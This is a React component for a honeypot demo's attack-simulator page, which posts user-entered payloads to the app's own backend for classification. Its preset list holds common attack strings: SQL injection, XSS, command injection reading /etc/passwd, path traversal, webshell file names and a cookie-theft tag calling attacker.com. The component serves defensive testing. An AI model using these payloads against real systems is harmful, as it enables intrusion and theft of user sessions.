import { useState, useEffect } from "react";
import { sendAttack } from "../services/api";
import { GlassContainer } from "./ui/GlassContainer";
import { Crosshair, ShieldAlert, Cpu, Terminal, Zap, Info, Loader2 } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";

const DEMOS = {
  sqli: ["' OR 1=1 --", "' UNION SELECT null, username, password FROM users --", "' OR 'a'='a"],
  xss: ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>"],
  bruteforce: ["admin123", "password", "root", "guest"],
  command_injection: ["whoami; ping -c 4 127.0.0.1", "ls -la /var/www", "cat /etc/passwd"],
  path_traversal: ["../../../../etc/passwd", "../../../windows/system32/cmd.exe"],
  file_upload_attack: ["shell.php", "backdoor.php", "exploit.py"],
  ddos_pattern: ["AAAAAA repeated flood", "rapid request sequence"],
  csrf: ["<form action='/transfer'>", "<img src='http://attacker.com/steal?c='+document.cookie>"],
  jwt_attack: ["eyJhbGciOiJIUzI1Ni...", "eyJhbGciOiJub25l..."],
  api_abuse: ["/api/login spam", "/api/v1/debug"],
  normal: ["GET /profile", "POST /feedback"],
  suspicious: ["Click here to reset your compromised password", "Suspicious link.exe"]
};

export default function AttackSimulator() {
  const [input, setInput] = useState("");
  const [response, setResponse] = useState(null);
  const [loading, setLoading] = useState(false);
  const [sessionId, setSessionId] = useState("");

  useEffect(() => {
    let id = localStorage.getItem("aegis_session_id") || crypto.randomUUID();
    localStorage.setItem("aegis_session_id", id);
    setSessionId(id);
  }, []);

  const getRandomDemo = (type) => {
    const list = DEMOS[type] || ["test"];
    return list[Math.floor(Math.random() * list.length)];
  };

  const handleAttack = async () => {
    if (!input.trim()) return;
    setLoading(true);
    setResponse(null);
    try {
      await new Promise(r => setTimeout(r, 600));
      const res = await sendAttack({ input, source: sessionId || "anonymous" });
      setResponse(res);
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  const getRiskColor = (type) => {
    if (['sqli', 'command_injection', 'ddos_pattern'].includes(type)) return 'text-[var(--danger)]';
    if (['xss', 'path_traversal', 'jwt_attack'].includes(type)) return 'text-[var(--warning)]';
    return 'text-[var(--accent-cyber)]';
  };

  return (
    <div className="max-w-4xl mx-auto space-y-8 py-4">
      <div className="text-center space-y-2">
        <h1 className="text-3xl font-display font-bold text-[var(--text-main)] tracking-widest uppercase">
          Neural Payload Deployment
        </h1>
        <p className="text-[var(--text-dim)] font-mono text-sm uppercase tracking-tighter">
          Test the Sentinel Grid by injecting malicious behavior signatures.
        </p>
      </div>

      <GlassContainer className="p-8 space-y-6">
        <div className="space-y-3">
          <div className="flex items-center justify-between text-[var(--text-dim)] text-xs font-bold tracking-widest uppercase">
            <label className="flex items-center gap-2">
              <Zap className="w-3 h-3 text-[var(--accent-cyber)]" />
              Target Payload Buffer
            </label>
            <span>UTF-8 ENCODING</span>
          </div>
          <textarea
            value={input}
            onChange={(e) => setInput(e.target.value)}
            placeholder="Insert raw exploit payload..."
            className="w-full min-h-[140px] bg-black/40 border border-[var(--border-color)] rounded-lg p-4 font-mono text-sm text-[var(--text-main)] outline-none focus:border-[var(--accent-cyber)]/50 focus:ring-1 focus:ring-[var(--accent-cyber)]/10 transition-all resize-none shadow-inner"
          />
        </div>

        <div className="space-y-4 pt-2">
          <div className="text-[var(--text-dim)] text-[10px] font-bold tracking-widest uppercase flex items-center gap-2 px-1">
            <Info className="w-3 h-3" />
            Neural Injection Presets
          </div>
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
            {Object.keys(DEMOS).map(type => (
              <button
                key={type}
                onClick={() => setInput(getRandomDemo(type))}
                className="px-4 py-3 rounded-lg bg-[var(--surface-high)]/40 border border-[var(--border-color)] text-[var(--text-dim)] text-[11px] font-mono hover:text-[var(--accent-cyber)] hover:border-[var(--accent-cyber)]/40 hover:bg-[var(--accent-cyber)]/5 transition-all uppercase text-center truncate tracking-tighter"
              >
                {type.replace('_', ' ')}
              </button>
            ))}
          </div>
        </div>

        <button
          onClick={handleAttack}
          disabled={loading || !input.trim()}
          className={`w-full py-5 rounded-xl flex items-center justify-center gap-4 font-display font-bold text-sm tracking-[0.3em] uppercase transition-all overflow-hidden relative group mt-4 ${
            loading || !input.trim()
              ? 'bg-[var(--surface-high)]/50 text-[var(--text-dim)] cursor-not-allowed border border-[var(--border-color)]'
              : 'bg-[var(--danger)] text-black shadow-[0_0_25px_rgba(255,77,77,0.3)] hover:shadow-[0_0_35px_rgba(255,77,77,0.6)] active:scale-[0.98]'
          }`}
        >
          {loading ? (
            <Loader2 className="w-5 h-5 animate-spin" />
          ) : (
            <>
              <Crosshair className="w-5 h-5 group-hover:rotate-90 transition-transform duration-500" />
              Deploy Packet
            </>
          )}
        </button>
      </GlassContainer>

      <AnimatePresence>
        {response && (
          <motion.div
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: 10 }}
          >
            <GlassContainer className="overflow-hidden border-t-2 border-t-[var(--danger)]">
              <div className="flex items-center justify-between px-6 py-3 bg-[var(--surface-high)]/50 border-b border-[var(--border-color)]">
                <div className="flex items-center gap-3">
                  <Cpu className="w-4 h-4 text-[var(--accent-cyber)]" />
                  <span className="text-[10px] text-[var(--text-dim)] font-mono tracking-widest uppercase leading-none mt-0.5">
                    Honeypot Response Stream
                  </span>
                </div>
                <div className={`text-[10px] font-bold tracking-tighter ${getRiskColor(response.attack_type)}`}>
                  {response.attack_type.toUpperCase()} INTERCEPTED
                </div>
              </div>
              <div className="p-6">
                <pre className="font-mono text-xs leading-relaxed text-[var(--text-main)] bg-black/30 p-4 rounded border border-[var(--border-color)] overflow-x-auto whitespace-pre-wrap min-h-[100px]">
                  {response.ai_output}
                </pre>
              </div>
            </GlassContainer>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
